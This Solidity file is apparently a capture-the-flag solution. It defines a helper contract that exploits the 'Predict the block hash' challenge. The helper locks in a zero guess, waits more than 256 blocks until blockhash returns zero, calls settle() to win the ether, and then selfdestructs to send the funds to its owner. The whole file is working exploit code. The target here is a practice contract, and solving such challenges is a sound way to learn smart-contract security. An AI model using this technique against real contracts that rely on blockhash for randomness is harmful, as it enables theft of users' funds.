pragma solidity ^0.4.21;

import "../PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashHelper {
    address owner;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashHelper() public {
        owner = msg.sender;
    }

    function lockInGuess(address _lottery) external payable {
        settlementBlockNumber = block.number + 1;
        PredictTheBlockHashChallenge(_lottery).lockInGuess.value(1 ether)(
            bytes32(0)
        );
    }

    function exploit(address _lottery) external payable {
        require(settlementBlockNumber + 256 < block.number);
        PredictTheBlockHashChallenge(_lottery).settle();
    }

    function answer(uint256 blockNumber) public view returns (uint8) {
        return uint8(keccak256(block.blockhash(blockNumber - 1), now)) % 10;
    }

    function withdrawAllFunds() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function() external payable {}
}
